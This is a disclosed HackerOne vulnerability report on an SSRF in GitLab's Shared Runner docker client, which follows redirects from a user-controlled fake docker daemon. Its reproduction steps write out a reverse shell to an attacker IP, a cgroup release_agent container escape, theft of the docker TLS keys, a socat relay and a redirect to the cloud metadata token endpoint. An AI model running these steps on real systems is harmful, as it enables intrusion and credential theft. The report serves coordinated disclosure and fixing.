# SSRF into Shared Runner, by replacing dockerd with malicious server in Executor

## Report Details
- **Report ID**: 809248
- **URL**: https://hackerone.com/reports/809248
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-03T05:15:48.530Z
- **Disclosed**: 2020-09-08T13:28:39.515Z

## Reporter
- **Username**: lucash-dev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
# Note

I've assigned the severity HIGH and submitted this report based on previously disclosed blind SSRF bugs that were previously disclosed.
(https://hackerone.com/reports/398799)
If that's not correct, please adjust or let me know if you require more immediate impact on users in order to consider it.


# Description

The Shared Runners implementation has a bug in its docker client
that allows following HTTP redirection. Because it accesses the
docker daemons running in executors -- which are completely under
control of users -- a malicious user can replace the existing
dockerd with a malicious HTTPS server that sends redirect responses.
The TLS validation can't prevent this attack, as both public and
private keys used by the docker daemon in the executor are also
under the CI job's (so the user's) control.

An attacker can use that to perform (mostly blind) SSRF attacks
targetting the Shared Runner local host, link-local and local networks.
In case of an error response from the target, the response body
will be displayed in the CI job's logs.
A succcessful HTTP request will result in the first character of
the response being visible, or -- if the response is a valid JSON --
will cause the process to hang.
TCP (other than HTTP) targets also partially reveal the response.

This can be used, for example to send requests to Google Cloud's metadata
service, but so far I've been unable to obtain the access token
(only the first character `a` is visible).

The culprit seems to be 
`https://gitlab.com/gitlab-org/gitlab-runner/-/blob/master/helpers/docker/official_docker_client.go#L45`

The line `httpClient := &http.Client{Transport: transport}` seems to be missing a proper
redirect policy.


# Steps to reproduce

There are a number of steps to reproduce this issue the way I did.
Most of them could be automated or simplified with further effort, but I think
the existing process can be followed relatively easily. Please let me know if you 
have trouble with it.

1 - Run a CI job and obtain a reverse shell into the Executor

Create a CI jobs that runs a command like 
```
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

Replace the IP address with the address of an external machine you control.

Use `nc -lvp 4444` to obtain the reverse shell from your machine.

2 - Prepare root access to the Executor and mount host file system

In the shell, run the following commands:

```
mkdir /h ;
mount /dev/sda9 /h;
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x;
echo 1 > /tmp/cgrp/x/notify_on_release;
export host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;
 echo "$host_path/cmd" > /tmp/cgrp/release_agent;
```

This will both mount the host storage volume and prepare a cgroup trigger for running commands
as root.

3 - Obtain docker's certificate public and private keys

Run these commands:

```
cat /h/etc/docker/server.pem
cat /h/etc/docker/server-key.pem
```

4 - Set up a malicious HTTPS server in a machine you control

Copy the text of `server.pem` and `server-key.pem` to the corresponding files in your attacker
machine.

Run the attached `maliciousHttpsServer.py`.

This will start an HTTPS server that uses the certs in the provided `server.pem` and `server-key.pem`
files. That way the Runner docker client has no way to tell it from the legitimate `dockerd`.


5 - Obtain the PID that's listening to port 2376 (docker daemon)

Run the following commands:
```
echo '#!/bin/sh' > /cmd
echo "sudo netstat -tanp > $host_path/n2" >> /cmd
chmod a+x /cmd
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /n2
```

Take note of the PID listening to 2376.


6 - Kill the daemon and use `socat` to redirect IP packets to your
external machine.

Now we must send the traffic from the Executor to our attack box:

```
echo '#!/bin/sh' > /cmd
echo "sudo kill -9 999 && socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2> $host_path/k2" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
Replace `999` with the correct PID, and `1.2.3.4` with the IP of your attack box.

7 - The external HTTPS now will redirect the Runner's Docker Client's
requests to the target.

Now the connection flow we have is this

```
[Runner-client] --TLS--> [Executor] --Socat--> [Malicious-HTTPS-server] --Redirect--> [Runner-client] --HTTP--> Target

```

The `maliciousHttpServer.py` script is configured to redirect GET requests to
`http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text

(BTW the `v1beta1` endpoint is still working)

The same technique can be used to obtain SSRF with POST and DELETE requests.

8 - Observe the response in the job's error logs.

Now the Shared Runner will try to keep track of the running job, but it's HTTP requests
will end up hitting the metadata endpoint, so the response won't be valid.
The first letter of the response (`a` for `access_Token`) will show up in an error message
when it's trying to parse the response.



# What is the expected behavior

The Runner's docker client shouldn't trust the docker daemon, and
shouldn't follow redirections from the docker REST API, much less
redirections to local addresses.

# What is the actual bug behavior

The Runner's docker client follows redirect responses sent by
the executor's docker daemon. 


# Impact

The issue described here allows an attacker to hit local host, local network, and link-local
addresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary
endpoints.
The request response can be partially obtained in case of a successful request, or completely
obtained in case of an error response code.

Since the Share Runners are shared between different projects/users and command the CI jobs
for these, the issue seems relevant.

Other impacts that might be possibly obtained (though not tested as might cause disruption of
service) include:
- Resource exhaustion through hanging jobs (when the HTTP response is a valid JSON).
- Resource exhaustion by sending excessively large responses, in particular, using gzip
encoding.

I'm still actively researching ways of obtaining the full HTTP response, as well as other
target endpoints, and will report in the comments further findings.

## Impact

# Impact

The issue described here allows an attacker to hit local host, local network, and link-local
addresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary
endpoints.
The request response can be partially obtained in case of a successful request, or completely
obtained in case of an error response code.

Since the Share Runners are shared between different projects/users and command the CI jobs
for these, the issue seems relevant.

Other impacts that might be possibly obtained (though not tested as might cause disruption of
service) include:
- Resource exhaustion through hanging jobs (when the HTTP response is a valid JSON).
- Resource exhaustion by sending excessively large responses, in particular, using gzip
encoding.

I'm still actively researching ways of obtaining the full HTTP response, as well as other
target endpoints, and will report in the comments further findings.

## Attachments
- maliciousHttpsServer.py
